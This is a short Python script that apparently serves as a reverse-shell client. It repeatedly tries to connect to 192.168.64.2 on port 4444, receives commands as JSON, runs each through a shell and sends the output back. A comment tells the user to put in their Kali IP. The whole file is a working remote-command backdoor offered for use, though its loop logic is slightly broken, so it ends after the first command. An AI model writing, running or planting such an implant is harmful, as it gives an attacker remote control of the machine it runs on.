import socket
import json
import subprocess
import os
import base64
import time
import subprocess

def server_connect(ip, port):
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)

def send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def receive():
    json_data = ''
    while True:
        try:
            json_data += connection.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def client_run():
    while True:
        cmd = receive()
        if cmd:
            print(f"Received: {cmd}")
            result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
            print(f"Result: {result.stdout}")
            send(result.stdout)
        if KeyboardInterrupt:
            connection.close()
            break

server_connect('192.168.64.2', 4444) #Replace 10.0.2.15 with your Kali IP

client_run()